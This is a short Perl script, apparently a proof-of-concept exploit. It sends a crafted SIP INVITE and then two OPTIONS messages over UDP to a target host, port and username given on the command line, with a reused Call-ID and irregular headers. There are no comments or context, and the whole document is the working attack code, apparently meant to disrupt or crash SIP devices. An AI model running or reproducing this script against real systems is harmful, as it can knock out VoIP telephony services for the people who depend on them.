#!/usr/bin/perl

use IO::Socket::INET;

die "Usage $0 <dst> <port> <username>" unless ($ARGV[2]);

 

$socket=new IO::Socket::INET->new(PeerPort=>$ARGV[1],

        Proto=>'udp',

        PeerAddr=>$ARGV[0]);

 

$msg = "INVITE sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia:
SIP/2.0/UDP\t192.168.1.2;rport;branch=00\r\nFrom:
<sip:gasparin\@192.168.1.2>;tag=00\r\nTo:
<sip:$ARGV[2]\@$ARGV[0]>;tag=00\r\nCall-ID: et\@192.168.1.2\r\nCSeq: 10
INVITE\r\nContent-Length: 0\r\n\r\n";;

$socket->send($msg);

 

sleep(1);

$msg ="OPTIONS sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP
192.168.1.2;rport;branch=01\r\nFrom:
<sip:gasparin\@192.168.1.2>;tag=01\r\nTo:
<sip:$ARGV[2]\@$ARGV[0]>\r\nCall-ID: et\@192.168.1.2\r\nCSeq: 11
OPTIONS\r\nContent-Length: 0\r\n\r\n";

$socket->send($msg);

 

sleep(1);

$msg ="OPTIONS sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP
192.168.1.2;rport;branch=02\r\nFrom:
<sip:gasparin\@192.168.1.2>;tag=02\r\nTo:
<sip:$ARGV[2]\@$ARGV[0]>\r\nCall-ID: et\@192.168.1.2\r\nCSeq: 12
OPTIONS\r\nContent-Length: 0\r\n\r\n";

$socket->send($msg);

